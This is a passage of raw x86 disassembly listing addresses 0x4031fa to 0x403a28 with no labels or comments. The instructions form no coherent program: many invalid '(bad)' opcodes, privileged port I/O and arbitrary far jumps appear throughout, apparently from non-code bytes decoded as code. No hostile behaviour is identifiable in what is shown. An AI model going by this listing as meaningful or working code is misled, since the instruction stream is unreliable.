  4031fa:	sub    al,0xa1
  4031fc:	xor    ecx,0xffffffba
  4031ff:	adc    eax,0xbfb3c38c
  403204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403205:	mov    esi,0xe89387e8
  40320a:	pop    es
  40320b:	xchg   esi,eax
  40320c:	add    esi,DWORD PTR [eax]
  40320e:	in     eax,dx
  40320f:	and    BYTE PTR [eax],bl
  403211:	inc    esp
  403212:	adc    BYTE PTR [eax+0x15],0x3d
  403216:	ficomp DWORD PTR [eax-0x40023637]
  40321c:	out    0x5f,al
  40321e:	dec    ebx
  40321f:	pop    ebx
  403220:	push   esi
  403221:	mov    bh,0xdd
  403223:	call   0xffed:0xc6a13d8a
  40322a:	lods   al,BYTE PTR ds:[esi]
  40322b:	js     0x4032a8
  40322d:	outs   dx,BYTE PTR ds:[esi]
  40322e:	and    cl,al
  403230:	inc    ecx
  403231:	stos   DWORD PTR es:[edi],eax
  403232:	xchg   ecx,eax
  403233:	cdq    
  403234:	jl     0x4032b4
  403236:	fs ja  0x4031f1
  403239:	jecxz  0x40329d
  40323b:	ret    0x9a9a
  40323e:	aam    0x32
  403240:	(bad)  
  403241:	hlt    
  403242:	repz cmp DWORD PTR [edi],ebp
  403245:	scas   eax,DWORD PTR es:[edi]
  403246:	jmp    0x92a6:0x5b149daf
  40324d:	test   eax,0xfcf162b8
  403252:	mov    esp,0xfb038e59
  403257:	outs   dx,DWORD PTR ds:[esi]
  403258:	loopne 0x4032d2
  40325a:	jb     0x4031dc
  40325c:	mov    ebp,edi
  40325e:	mov    cl,0x27
  403260:	js     0x4032a5
  403262:	out    dx,eax
  403263:	xor    BYTE PTR [edx],bh
  403265:	inc    ebx
  403266:	scas   al,BYTE PTR es:[edi]
  403267:	call   0xdb12:0x7ff736b
  40326e:	push   ebx
  40326f:	cs shl bl,cl
  403272:	xor    edx,0x87f9a7c4
  403278:	xchg   ebx,eax
  403279:	lds    esp,FWORD PTR [eax]
  40327b:	jns    0x403222
  40327d:	pop    edx
  40327e:	not    BYTE PTR [esi-0x58]
  403281:	add    eax,0x4b579ec9
  403286:	push   0xffffffd9
  403288:	and    ebp,DWORD PTR ds:0x8e488a2e
  40328e:	repz jns 0x403256
  403291:	stos   DWORD PTR es:[edi],eax
  403292:	sub    al,0xe8
  403294:	pop    edx
  403295:	mov    al,ah
  403297:	(bad)  
  403298:	xor    eax,0xabc96cb3
  40329d:	iret   
  40329e:	sub    eax,0x739e9ef1
  4032a3:	xchg   esp,eax
  4032a4:	nop
  4032a5:	mov    dh,0x9a
  4032a7:	dec    edx
  4032a8:	mov    DWORD PTR [ebp-0x297007a],esp
  4032ae:	adc    DWORD PTR [ebx+0x24],ebp
  4032b1:	retf   0x3e2c
  4032b4:	mov    ecx,0x3c18dad5
  4032b9:	imul   esi,ebp,0x63
  4032bc:	stos   DWORD PTR es:[edi],eax
  4032bd:	add    eax,0x27a49b4
  4032c2:	add    ecx,DWORD PTR [edi]
  4032c4:	sub    bh,BYTE PTR [ebp+0x63249744]
  4032ca:	hlt    
  4032cb:	jmp    0x403253
  4032cd:	and    BYTE PTR [eax+0x4296cb31],ch
  4032d3:	neg    cl
  4032d5:	scas   al,BYTE PTR es:[edi]
  4032d6:	mov    dh,0xfa
  4032d8:	js     0x4032d8
  4032da:	into   
  4032db:	mov    eax,0xc11544b3
  4032e0:	cdq    
  4032e1:	push   ebp
  4032e2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032e4:	push   0x2f
  4032e6:	(bad)  
  4032e7:	mov    ah,0xdc
  4032e9:	dec    ecx
  4032ea:	sbb    edi,DWORD PTR [eax-0x3]
  4032ed:	push   eax
  4032ee:	sub    dh,dh
  4032f0:	push   ebp
  4032f1:	sbb    DWORD PTR [edx-0x5e97c517],0x28
  4032f8:	sub    al,0xfb
  4032fa:	mov    ds:0xeec11991,eax
  4032ff:	adc    BYTE PTR ss:[eax+0x17a55cdf],bl
  403306:	in     al,dx
  403307:	mov    dl,0x78
  403309:	sar    BYTE PTR [edx+0x75],1
  40330c:	dec    esi
  40330d:	ret    0x4e37
  403310:	xor    DWORD PTR [ecx-0xb],0x6f
  403314:	sti    
  403315:	js     0x4032ac
  403317:	mov    cl,0xfe
  403319:	ins    BYTE PTR es:[edi],dx
  40331a:	inc    eax
  40331b:	sar    BYTE PTR [edx+esi*1+0x54],0xbb
  403320:	dec    eax
  403321:	retf   0xdd1
  403324:	jb     0x4032ea
  403326:	mov    bh,0x2e
  403328:	pop    edx
  403329:	push   esp
  40332a:	daa    
  40332b:	cld    
  40332c:	pop    es
  40332d:	sahf   
  40332e:	es iret 
  403330:	push   eax
  403331:	xchg   esi,eax
  403332:	dec    eax
  403333:	in     al,dx
  403334:	xchg   edx,eax
  403335:	or     BYTE PTR [edx+ebx*8],bh
  403338:	fisub  WORD PTR [edi+0x72a85e24]
  40333e:	int3   
  40333f:	sahf   
  403340:	inc    edx
  403341:	or     DWORD PTR [ebp+0x60e99d5e],ebx
  403347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403348:	out    dx,al
  403349:	mov    eax,ds:0xdf9b5dc3
  40334e:	inc    esp
  40334f:	sbb    al,0xeb
  403351:	in     eax,0xf
  403353:	aam    0x93
  403355:	mov    dh,0xe5
  403357:	lea    edx,[ebp+0x9f5e1aa]
  40335d:	lock xor al,0x99
  403360:	push   ebp
  403361:	ins    DWORD PTR es:[edi],dx
  403362:	call   0x24e0:0xfd3d5658
  403369:	cmp    edi,DWORD PTR [eax]
  40336b:	mov    esi,0xe7e139fc
  403370:	out    0x85,al
  403372:	js     0x403331
  403374:	out    dx,al
  403375:	mov    edx,0xcb2d610f
  40337a:	cmp    DWORD PTR [ebx+0x35c68567],esi
  403380:	mov    ebx,ds
  403382:	mov    cl,BYTE PTR [ebx]
  403384:	sti    
  403385:	leave  
  403386:	mov    bh,0x78
  403388:	scas   eax,DWORD PTR es:[edi]
  403389:	rcl    DWORD PTR [esp+ebp*8-0x1fb8bd0c],cl
  403390:	clc    
  403391:	lahf   
  403392:	sbb    al,0xeb
  403394:	xor    DWORD PTR [ecx+ecx*8-0x7261a367],esp
  40339b:	pop    ebp
  40339c:	sub    bl,bl
  40339e:	pop    esi
  40339f:	nop
  4033a0:	mov    al,ds:0xf587f506
  4033a5:	loop   0x40338c
  4033a7:	(bad)  [eax+0x5134f358]
  4033ad:	cwde   
  4033ae:	ja     0x40333e
  4033b0:	cmp    BYTE PTR [ebp+0x352e7b9e],ch
  4033b6:	and    esp,DWORD PTR [ebx]
  4033b8:	rcr    DWORD PTR [eax-0x69],1
  4033bb:	push   ebx
  4033bc:	(bad)  
  4033bd:	jne    0x4033b2
  4033bf:	test   eax,0x65689133
  4033c4:	jae    0x403370
  4033c6:	cmp    eax,0x73140e39
  4033cb:	in     al,0x98
  4033cd:	pop    es
  4033ce:	mov    ds:0x829bbf0e,eax
  4033d3:	daa    
  4033d4:	adc    esi,DWORD PTR [esi]
  4033d6:	pop    esp
  4033d7:	dec    esp
  4033d8:	retf   0x8edc
  4033db:	xor    ch,BYTE PTR [esi-0x50ce489a]
  4033e1:	scas   eax,DWORD PTR es:[edi]
  4033e2:	js     0x403407
  4033e4:	cmp    DWORD PTR [ebp-0x200de20a],esp
  4033ea:	fxch   st(3)
  4033ec:	les    ebx,FWORD PTR [edx+ebp*1]
  4033ef:	nop
  4033f0:	fwait
  4033f1:	sbb    BYTE PTR [ecx+0x4cf3656e],dh
  4033f7:	gs inc ebx
  4033f9:	mov    dh,0xab
  4033fb:	pop    ss
  4033fc:	jl     0x40343e
  4033fe:	adc    esp,DWORD PTR [ebp-0x1f]
  403401:	sbb    esp,DWORD PTR [edx+0x21ee72cc]
  403407:	and    esi,DWORD PTR [esi]
  403409:	mov    dh,0x84
  40340b:	or     DWORD PTR [ebx+ebx*2+0x56],ebx
  40340f:	push   0xe12e2d10
  403414:	leave  
  403415:	stc    
  403416:	retf   0x94ff
  403419:	clc    
  40341a:	jmp    0x91ebd218
  40341f:	inc    ch
  403421:	jo     0x40347b
  403423:	pop    edi
  403424:	mov    al,ds:0x76c9b069
  403429:	inc    ecx
  40342a:	inc    eax
  40342b:	neg    al
  40342d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40342e:	mov    eax,ds:0x741e144b
  403433:	vpsllw ymm6,ymm6,xmm0
  403437:	dec    edx
  403438:	cmp    DWORD PTR [edx+0x16],edi
  40343b:	mov    dh,0x19
  40343d:	pop    ebp
  40343e:	mov    al,0x3a
  403440:	in     al,dx
  403441:	call   0x13ea1413
  403446:	or     edi,DWORD PTR ds:0xc5c72f3f
  40344c:	retf   
  40344d:	ss xchg ebx,eax
  40344f:	or     bl,BYTE PTR [edx-0x29fe85b5]
  403455:	sbb    eax,0x36cb48d9
  40345a:	dec    edi
  40345b:	sbb    al,0xdc
  40345d:	mov    cl,0x29
  40345f:	jo     0x40347d
  403461:	sub    BYTE PTR [esi],ch
  403463:	nop
  403464:	and    BYTE PTR [edx-0x75d64cc9],bh
  40346a:	jge    0x4034a5
  40346c:	repnz test al,0xea
  40346f:	dec    edx
  403470:	(bad)  
  403471:	mov    eax,ds:0x712d5c26
  403476:	dec    esi
  403477:	xor    bl,BYTE PTR [ebx+0x334db6ec]
  40347d:	lea    edi,[eax-0x6270cc72]
  403483:	ret    0xe352
  403486:	std    
  403487:	shr    DWORD PTR [eax-0x78a4eb8],0xbe
  40348e:	jno    0x4034c7
  403490:	inc    edi
  403491:	jns    0x4034d1
  403493:	lahf   
  403494:	mov    BYTE PTR [edx-0x2e],bh
  403497:	enter  0x1c0e,0xe9
  40349b:	cmp    dh,cl
  40349d:	lods   al,BYTE PTR ds:[esi]
  40349e:	push   edi
  40349f:	pop    ss
  4034a0:	adc    dh,cl
  4034a2:	lods   eax,DWORD PTR ds:[esi]
  4034a3:	stc    
  4034a4:	fisttp DWORD PTR [ebx-0x102e7ff7]
  4034aa:	ret    0x5a28
  4034ad:	jecxz  0x40350e
  4034af:	jge    0x40348f
  4034b1:	inc    ecx
  4034b2:	mov    ah,0xfc
  4034b4:	or     eax,0xe079f96f
  4034b9:	stos   DWORD PTR es:[edi],eax
  4034ba:	shr    BYTE PTR [ebx],1
  4034bc:	mov    edi,0x55cad738
  4034c1:	jo     0x40348e
  4034c3:	sbb    DWORD PTR [ebp+0x53dcd7f4],esp
  4034c9:	push   0x58
  4034cb:	jno    0x403484
  4034cd:	(bad)  
  4034ce:	loope  0x4034e2
  4034d0:	stc    
  4034d1:	leave  
  4034d2:	sbb    BYTE PTR [edi-0x1ddbf0c9],bl
  4034d8:	jne    0x403538
  4034da:	arpl   WORD PTR [edx-0x5d],dx
  4034dd:	push   eax
  4034de:	hlt    
  4034df:	xor    ch,cl
  4034e1:	mov    dh,ch
  4034e3:	(bad)  
  4034e4:	out    0xd8,eax
  4034e6:	pop    es
  4034e7:	test   al,0xe0
  4034e9:	sti    
  4034ea:	xchg   ecx,eax
  4034eb:	sub    al,0xb9
  4034ed:	bound  ecx,QWORD PTR ds:0xef946477
  4034f3:	xor    eax,0xa4b151ab
  4034f8:	mov    cl,0x92
  4034fa:	xchg   DWORD PTR ds:0x69cbd3a7,edx
  403500:	adc    ah,al
  403502:	jae    0x4034c6
  403504:	test   BYTE PTR [edi-0x41f273c2],bl
  40350a:	inc    ebx
  40350b:	pop    esp
  40350c:	jns    0x4034ea
  40350e:	shl    ebx,cl
  403510:	cld    
  403511:	jmp    0x944fcfc
  403516:	adc    al,BYTE PTR [edx]
  403518:	aaa    
  403519:	jb     0x4034d6
  40351b:	(bad)  
  40351c:	dec    esp
  40351d:	mov    WORD PTR [ecx-0x1627c79],fs
  403523:	add    DWORD PTR [esi],ebp
  403525:	sbb    edi,0x86beb761
  40352b:	loope  0x40352e
  40352d:	push   0xa8090c85
  403532:	leave  
  403533:	push   esi
  403534:	mov    ebp,0x25d88be4
  403539:	or     BYTE PTR [ecx],bl
  40353b:	daa    
  40353c:	push   ds
  40353d:	shl    ecx,1
  40353f:	imul   eax,DWORD PTR [edi],0xeb5650c5
  403545:	leave  
  403546:	cmp    al,BYTE PTR [eax]
  403548:	enter  0x9335,0xa6
  40354c:	fmul   DWORD PTR [ebx]
  40354e:	popa   
  40354f:	pop    esi
  403550:	sbb    al,0xce
  403552:	cmp    BYTE PTR [edx+0x1a854d88],bl
  403558:	mov    edi,0xb764ca52
  40355d:	out    dx,al
  40355e:	rcr    eax,cl
  403560:	xor    bh,BYTE PTR [edx-0x17786408]
  403566:	adc    al,0x8f
  403568:	pop    ds
  403569:	dec    ebx
  40356a:	xor    bh,BYTE PTR [edx-0x6facf75a]
  403570:	fmul   DWORD PTR [eiz*8-0x18cc1fd8]
  403577:	cli    
  403578:	fcmovbe st,st(1)
  40357a:	outs   dx,BYTE PTR ds:[esi]
  40357b:	js     0x4035a9
  40357d:	mov    ecx,0x9aef3392
  403582:	xchg   edx,eax
  403583:	lahf   
  403584:	sub    DWORD PTR [eax+0x5be27311],0x55
  40358b:	bound  ebp,QWORD PTR [ebx]
  40358d:	and    ah,BYTE PTR [edi+0x3e]
  403590:	adc    al,0x42
  403592:	jp     0x4035fa
  403594:	bound  esi,QWORD PTR [edx+ecx*4-0x24241bff]
  40359b:	sahf   
  40359c:	xchg   edx,eax
  40359d:	and    ecx,ebp
  40359f:	imul   esi,DWORD PTR [ecx],0xffffffbf
  4035a2:	aad    0x1b
  4035a4:	sbb    ebx,DWORD PTR [ebx+0x13]
  4035a7:	fs std 
  4035a9:	xor    edi,DWORD PTR [edi-0x723826b9]
  4035af:	or     al,0x17
  4035b1:	fwait
  4035b2:	ins    BYTE PTR es:[edi],dx
  4035b3:	nop
  4035b4:	es sbb dl,ch
  4035b7:	pop    edi
  4035b8:	outs   dx,BYTE PTR ds:[esi]
  4035b9:	leave  
  4035ba:	sub    edx,DWORD PTR [esi+0x3c]
  4035bd:	jae    0x4035c7
  4035bf:	and    eax,0xac126922
  4035c4:	bound  ebx,QWORD PTR [esi+0x48b3b463]
  4035ca:	stc    
  4035cb:	sbb    DWORD PTR ds:0x33b8b992,0x5
  4035d2:	stc    
  4035d3:	cdq    
  4035d4:	shr    DWORD PTR [ecx*2-0x25fe4535],0x6
  4035dc:	push   0xffffffe6
  4035de:	push   esp
  4035df:	pusha  
  4035e0:	mov    cl,BYTE PTR [eax-0x76]
  4035e3:	leave  
  4035e4:	dec    edi
  4035e5:	xchg   ebx,eax
  4035e6:	sbb    al,0xd1
  4035e8:	popf   
  4035e9:	pop    ds
  4035ea:	sub    al,0x16
  4035ec:	xor    DWORD PTR [ebx+0x49e955be],esp
  4035f2:	dec    sp
  4035f4:	cmp    eax,0x471530b
  4035f9:	test   BYTE PTR [ebp-0x503abce0],al
  4035ff:	jl     0x403604
  403601:	mov    edx,0xf62da208
  403606:	ret    
  403607:	imul   edi,DWORD PTR [edi+0xf890dec],0xcc17c40f
  403611:	mov    ah,0x45
  403613:	jbe    0x40368f
  403615:	mov    BYTE PTR [eax],ah
  403617:	push   es
  403618:	adc    edi,DWORD PTR [esi+0x511d2690]
  40361e:	push   eax
  40361f:	rcr    cl,1
  403621:	cdq    
  403622:	pop    ebx
  403623:	push   es
  403624:	sbb    bh,al
  403626:	add    BYTE PTR [edi+0xc],dh
  403629:	aaa    
  40362a:	jne    0x4035fb
  40362c:	jns    0x403680
  40362e:	adc    esp,DWORD PTR [edi]
  403630:	mov    edi,0x406af3a2
  403635:	(bad)  
  403636:	xor    BYTE PTR [ebx+0x71b6c7b4],bl
  40363c:	stc    
  40363d:	push   edx
  40363e:	xlat   BYTE PTR ds:[ebx]
  40363f:	pop    esp
  403640:	cmp    BYTE PTR ds:[esi-0x1ad8b976],cl
  403647:	sbb    ebx,ebx
  403649:	cwde   
  40364a:	out    dx,al
  40364b:	bound  esp,QWORD PTR ds:0x9b01ecb4
  403651:	rcr    BYTE PTR [ebx-0x670169f9],1
  403657:	shl    cl,1
  403659:	mov    BYTE PTR [ebp-0x24475276],dl
  40365f:	test   BYTE PTR [ebx-0x6814e90a],dh
  403665:	mov    esp,0x73ee9ca7
  40366a:	daa    
  40366b:	leave  
  40366c:	xor    ebp,DWORD PTR [esi]
  40366e:	dec    ebp
  40366f:	lahf   
  403670:	mov    bh,0xd3
  403672:	inc    ebx
  403673:	imul   esi,DWORD PTR [ebp+ebx*2-0x3],0x1a8c2427
  40367b:	sub    DWORD PTR [edi+0x1f],edi
  40367e:	or     al,0xdf
  403680:	ss mov ebx,0x7e1b6f80
  403686:	fcom   QWORD PTR [edi+0x47ff1a04]
  40368c:	mov    dl,0xbc
  40368e:	out    dx,eax
  40368f:	ficomp DWORD PTR [esi+0x9b3a620]
  403695:	jns    0x4036d7
  403697:	aad    0x41
  403699:	enter  0x212,0x98
  40369d:	test   DWORD PTR [ebx-0x3507cb27],eax
  4036a3:	nop
  4036a4:	call   0x5e4c:0xa410a4b8
  4036ab:	push   0xffffffa4
  4036ad:	lds    ecx,FWORD PTR [ebp+0x8eee3cd]
  4036b3:	adc    DWORD PTR [ebp+esi*2+0xb452590],0x57207651
  4036be:	nop
  4036bf:	sbb    BYTE PTR [ebx],dl
  4036c1:	inc    esp
  4036c2:	fdivr  QWORD PTR [eax]
  4036c4:	scas   al,BYTE PTR es:[edi]
  4036c5:	ds sbb al,0xf9
  4036c8:	aad    0x9b
  4036ca:	ds inc esp
  4036cc:	mov    WORD PTR [esi-0xccd98f6],ds
  4036d2:	js     0x403727
  4036d4:	push   ecx
  4036d5:	jmp    0xcfc4:0xb580bd83
  4036dc:	jb     0x40368f
  4036de:	pusha  
  4036df:	xor    al,0x77
  4036e1:	ja     0x403698
  4036e3:	repnz add ebp,edx
  4036e6:	das    
  4036e7:	push   ebp
  4036e8:	adc    eax,0xb8979959
  4036ed:	pop    edi
  4036ee:	iret   
  4036ef:	(bad)  
  4036f0:	push   ds
  4036f1:	inc    ebp
  4036f2:	sub    al,0x5a
  4036f4:	cmp    BYTE PTR [eax+0x73],cl
  4036f7:	pop    ebx
  4036f8:	xor    al,0xd7
  4036fa:	xlat   BYTE PTR ds:[ebx]
  4036fb:	aam    0xbc
  4036fd:	sub    BYTE PTR [ebp+ebx*1-0x69],bl
  403701:	xor    edi,DWORD PTR [edx-0x19631600]
  403707:	mov    al,ds:0x1ae62f72
  40370c:	jge    0x40378b
  40370e:	inc    esp
  40370f:	adc    DWORD PTR [esi],0xffffff97
  403712:	out    0x79,eax
  403714:	and    BYTE PTR [ebp+ecx*2-0x7f],bl
  403718:	rcl    DWORD PTR [edx-0x6e],cl
  40371b:	lods   al,BYTE PTR ds:[esi]
  40371c:	push   ecx
  40371d:	daa    
  40371e:	xchg   ebp,eax
  40371f:	xor    BYTE PTR [edi+0x4c5ef860],dl
  403725:	vcmppd ymm0,ymm5,YMMWORD PTR [esi],0x7e
  40372a:	jbe    0x40375d
  40372c:	in     al,0x34
  40372e:	lods   eax,DWORD PTR ds:[esi]
  40372f:	cmp    al,0x23
  403731:	mov    ds:0x38eb4c5d,al
  403736:	sub    BYTE PTR [esi],0xe2
  403739:	mov    gs,WORD PTR [ecx+esi*2-0x70]
  40373d:	mov    bh,0xb6
  40373f:	pop    ss
  403740:	push   esp
  403741:	adc    DWORD PTR [eax-0x1c1ed94b],edi
  403747:	push   es
  403748:	push   edi
  403749:	pop    esp
  40374a:	cmp    eax,0x1e58c868
  40374f:	sub    eax,0x27191a00
  403754:	scas   al,BYTE PTR es:[edi]
  403755:	jle    0x403762
  403757:	cwde   
  403758:	fsub   QWORD PTR [ecx+0x5b]
  40375b:	xor    esi,DWORD PTR [edi-0x67217c88]
  403761:	repz je 0x403718
  403764:	into   
  403765:	pop    esp
  403766:	pop    es
  403767:	pop    ds
  403768:	pop    ecx
  403769:	fild   WORD PTR [ecx+ecx*4+0x23]
  40376d:	jns    0x4037c8
  40376f:	jns    0x4036fc
  403771:	cmp    al,BYTE PTR [esi-0x66]
  403774:	jmp    0xa4d34215
  403779:	fld    TBYTE PTR [edx-0x33]
  40377c:	cmp    edx,esp
  40377e:	iret   
  40377f:	cmp    ch,ah
  403781:	gs mov bh,0xe4
  403784:	mov    BYTE PTR [eax-0x1a0760a1],bh
  40378a:	add    DWORD PTR [ebp+0x44],ebp
  40378d:	and    cl,BYTE PTR [ecx-0x13]
  403790:	inc    ebp
  403791:	or     eax,0x326c7ac0
  403796:	retf   
  403797:	std    
  403798:	push   esi
  403799:	mov    WORD PTR [eax],?
  40379b:	mov    eax,ds:0xd398ad05
  4037a0:	xchg   edx,eax
  4037a1:	pop    es
  4037a2:	iret   
  4037a3:	rol    BYTE PTR [ebp-0x1c],1
  4037a6:	mov    es,edx
  4037a8:	daa    
  4037a9:	add    eax,0x31df85b3
  4037ae:	repz lahf 
  4037b0:	imul   ebx,DWORD PTR [esi+0x6325974],0xffffffa4
  4037b7:	inc    ecx
  4037b8:	enter  0xa630,0xac
  4037bc:	dec    ecx
  4037bd:	lock push esi
  4037bf:	test   DWORD PTR [ebp-0x23308b47],esp
  4037c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c6:	std    
  4037c7:	pop    eax
  4037c8:	dec    edi
  4037c9:	mov    ebp,es
  4037cb:	fcom   QWORD PTR [esp+eax*2]
  4037ce:	push   0xffffffde
  4037d0:	int    0x1f
  4037d2:	sets   BYTE PTR [esi-0x26]
  4037d6:	je     0x40384a
  4037d8:	mov    bl,0x54
  4037da:	xchg   BYTE PTR [esi-0x111436ed],cl
  4037e0:	mov    esi,0x57a404c2
  4037e5:	int    0xd
  4037e7:	fmul   DWORD PTR [esp+ebx*2-0x6551f064]
  4037ee:	or     bl,BYTE PTR [edx-0x75]
  4037f1:	push   ds
  4037f2:	test   BYTE PTR [ecx],0x95
  4037f5:	in     eax,0x2f
  4037f7:	retf   0xac8a
  4037fa:	xchg   ebp,eax
  4037fb:	and    al,0x8e
  4037fd:	(bad)  
  4037fe:	popf   
  4037ff:	xchg   ebx,eax
  403800:	cwde   
  403801:	sub    DWORD PTR [esi-0x14],0x51aa04e1
  403808:	add    eax,0x3ed471a3
  40380d:	adc    DWORD PTR [esi-0x2d],eax
  403810:	imul   ecx,ebx,0x2f8348fb
  403816:	or     ebx,DWORD PTR [edi-0x27973252]
  40381c:	iret   
  40381d:	mov    ds:0x7f65ceea,eax
  403822:	in     al,dx
  403823:	jbe    0x403855
  403825:	imul   ebp,ebx,0xebe25bd1
  40382b:	stos   BYTE PTR es:[edi],al
  40382c:	fimul  WORD PTR [eax]
  40382e:	xor    dh,BYTE PTR [ebx-0x7e791315]
  403834:	push   0x1e
  403836:	inc    ecx
  403837:	outs   dx,DWORD PTR ds:[esi]
  403838:	adc    ebp,DWORD PTR [esi+0x60]
  40383b:	mov    eax,0x3fc46e66
  403840:	test   DWORD PTR [ebx+0x25],0x66697d57
  403847:	call   0x9609:0x3d1397b3
  40384e:	xor    ah,BYTE PTR [ecx+ecx*8+0x5dd0e628]
  403855:	push   cs
  403856:	push   esp
  403857:	push   es
  403858:	cs add eax,0xd49096b6
  40385e:	jl     0x403830
  403860:	dec    edx
  403861:	fs gs sbb eax,0x3e22dc95
  403868:	lods   al,BYTE PTR ds:[esi]
  403869:	es xchg ebp,eax
  40386b:	dec    eax
  40386c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40386d:	ret    
  40386e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40386f:	add    ebp,0x5eaa9950
  403875:	out    0x9a,al
  403877:	and    DWORD PTR [edx+0x17],0x428c1f63
  40387e:	pusha  
  40387f:	sbb    DWORD PTR [ecx+0x79f430c2],edx
  403885:	cld    
  403886:	mov    es,WORD PTR [edi-0x38787be]
  40388c:	ja     0x4038a8
  40388e:	call   0x7c94a455
  403893:	test   eax,0xc16b6999
  403898:	mov    dh,0x39
  40389a:	aad    0x54
  40389c:	cmp    al,0x4d
  40389e:	mov    esi,DWORD PTR [ecx+edi*1-0x7c768aaa]
  4038a5:	jae    0x403917
  4038a7:	xor    al,0xc8
  4038aa:	dec    esi
  4038ab:	xchg   ebx,eax
  4038ac:	arpl   WORD PTR [ecx],bx
  4038ae:	push   edi
  4038af:	ja     0x40392e
  4038b1:	adc    esp,ebx
  4038b3:	fild   WORD PTR [ecx-0x6b]
  4038b6:	or     eax,0x9a077f3d
  4038bb:	dec    esi
  4038bc:	les    ebp,FWORD PTR gs:[ebx+0x304ec351]
  4038c3:	outs   dx,BYTE PTR ds:[esi]
  4038c4:	push   ds
  4038c5:	cmp    ebx,DWORD PTR [ebx+0x3]
  4038c8:	test   BYTE PTR [eax],cl
  4038ca:	rol    DWORD PTR [ebx+0x7b],1
  4038cd:	test   eax,0x2bd960e2
  4038d2:	pushf  
  4038d3:	stos   DWORD PTR es:[edi],eax
  4038d4:	sub    eax,0xa4deb836
  4038d9:	out    0x84,al
  4038db:	dec    edi
  4038dc:	in     eax,dx
  4038dd:	and    eax,0x6625d1bc
  4038e2:	es in  eax,dx
  4038e4:	inc    edx
  4038e5:	add    dl,BYTE PTR [edi-0x23]
  4038e8:	mov    al,0x56
  4038ea:	scas   al,BYTE PTR es:[edi]
  4038eb:	stos   DWORD PTR es:[edi],eax
  4038ec:	ret    0xbd1e
  4038ef:	mov    ecx,0x5423e00b
  4038f4:	rcl    BYTE PTR [edx],1
  4038f6:	pop    ebx
  4038f7:	aas    
  4038f8:	inc    eax
  4038f9:	repnz mov edx,0x4abf2632
  4038ff:	jne    0x40397f
  403901:	sub    DWORD PTR [esi+0x425f0a0b],ecx
  403907:	fcomip st,st(4)
  403909:	in     al,dx
  40390a:	(bad)  
  40390b:	cli    
  40390c:	add    esi,DWORD PTR [eax]
  40390e:	test   al,0xa6
  403910:	xchg   ecx,eax
  403911:	dec    eax
  403912:	mov    bl,0x84
  403914:	adc    DWORD PTR [ecx],edi
  403916:	cli    
  403917:	mov    ebp,0xde7b8d0f
  40391c:	and    cl,bh
  40391e:	shl    DWORD PTR [edi-0x746a3f48],1
  403924:	cmp    al,0x88
  403926:	dec    ecx
  403927:	fs scas eax,DWORD PTR es:[edi]
  403929:	out    0x2b,al
  40392b:	(bad)
  40392f:	cli    
  403930:	mov    DWORD PTR [esi-0x59],esi
  403933:	cli    
  403934:	xor    esp,ebp
  403936:	lods   eax,DWORD PTR ds:[esi]
  403937:	or     ch,BYTE PTR [eax-0x58]
  40393a:	enter  0x925b,0x57
  40393e:	lea    esp,[edx-0x64bb122f]
  403944:	iret   
  403945:	mov    ebp,0x23e31187
  40394a:	sbb    BYTE PTR [eax+edx*8-0x8],0xa2
  40394f:	sub    al,0x88
  403951:	in     eax,dx
  403952:	fwait
  403953:	dec    ebx
  403954:	in     eax,0xaa
  403956:	or     al,0x6b
  403958:	in     eax,0x93
  40395a:	cmp    al,0x2c
  40395c:	aas    
  40395d:	mov    ch,0x34
  40395f:	imul   eax,DWORD PTR [ebp-0x62c255d1],0xefcbcba3
  403969:	dec    ebp
  40396a:	(bad)  
  40396b:	mov    ecx,0x72b8983d
  403970:	shr    BYTE PTR [ebp+0x7ba0d3dd],cl
  403976:	sub    edx,ecx
  403978:	in     al,dx
  403979:	icebp  
  40397a:	fidivr WORD PTR [edi]
  40397c:	sub    BYTE PTR [ebx-0x58],bh
  40397f:	aad    0x50
  403981:	push   ecx
  403982:	sub    ch,BYTE PTR [ecx-0x10]
  403985:	mov    dl,0x48
  403987:	loop   0x403910
  403989:	imul   di,ax,0xe445
  40398e:	lea    edi,[ebx]
  403990:	mov    ebp,DWORD PTR [ebx-0x38ad773e]
  403996:	xchg   ebx,eax
  403997:	and    eax,0x9c6a8bc9
  40399c:	mov    al,ds:0x3003268b
  4039a1:	sbb    BYTE PTR [ecx],0x83
  4039a4:	out    dx,eax
  4039a5:	xchg   esi,eax
  4039a6:	push   eax
  4039a7:	test   al,0x3d
  4039a9:	fcom   DWORD PTR [ecx-0x450cc6e3]
  4039af:	mov    ds:0x43f1f548,al
  4039b4:	mov    ebx,edx
  4039b6:	lods   eax,DWORD PTR ds:[esi]
  4039b7:	inc    eax
  4039b8:	and    esp,DWORD PTR [ebx]
  4039ba:	mov    bh,BYTE PTR [esp+ebx*2-0x25a7e99]
  4039c1:	inc    DWORD PTR [esi]
  4039c3:	iret   
  4039c4:	push   esp
  4039c5:	mov    BYTE PTR [edx+0x79],dh
  4039c8:	out    0xf3,al
  4039ca:	mov    ds:0xf5113c26,al
  4039cf:	add    eax,0x9c127ec3
  4039d4:	outs   dx,DWORD PTR ds:[esi]
  4039d5:	jge    0x403992
  4039d7:	inc    ebx
  4039d8:	pushf  
  4039d9:	and    ecx,DWORD PTR [ebx+0x64299a4c]
  4039df:	and    cl,BYTE PTR [edi+eax*8+0x5672397]
  4039e6:	ret    0x9481
  4039e9:	cmp    eax,0x2e71055f
  4039ee:	push   ss
  4039ef:	or     eax,0x92e04ba5
  4039f4:	cmp    dh,0x30
  4039f7:	ins    DWORD PTR es:[edi],dx
  4039f8:	mov    ebp,ebp
  4039fa:	mov    edi,0x8ae7f49c
  4039ff:	imul   ecx,DWORD PTR [ebp+0x11],0xffffffe0
  403a03:	push   esp
  403a04:	mov    ah,0x61
  403a06:	xchg   ecx,eax
  403a07:	push   0x957c0818
  403a0c:	(bad)  
  403a0d:	int    0xe2
  403a0f:	sahf   
  403a10:	adc    al,bh
  403a12:	sub    eax,0xefb79830
  403a17:	push   esp
  403a18:	(bad)  [edi-0x59]
  403a1b:	dec    ebp
  403a1c:	cmp    al,ch
  403a1e:	scas   al,BYTE PTR es:[edi]
  403a1f:	imul   eax,DWORD PTR [eax+0x37],0xba80688d
  403a26:	and    cl,BYTE PTR [esi]
  403a28:	dec    ecx
